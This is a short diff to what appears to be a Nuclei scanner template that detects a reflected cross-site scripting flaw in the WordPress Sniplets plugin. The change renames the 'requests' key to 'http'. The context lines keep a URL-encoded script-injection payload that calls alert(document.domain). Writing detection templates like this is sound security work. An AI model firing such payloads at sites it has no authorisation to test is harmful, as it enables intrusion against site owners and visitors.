@@ -9,7 +9,7 @@ info:
     - https://www.exploit-db.com/exploits/5194
   tags: xss,wordpress,wp-plugin,wp
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
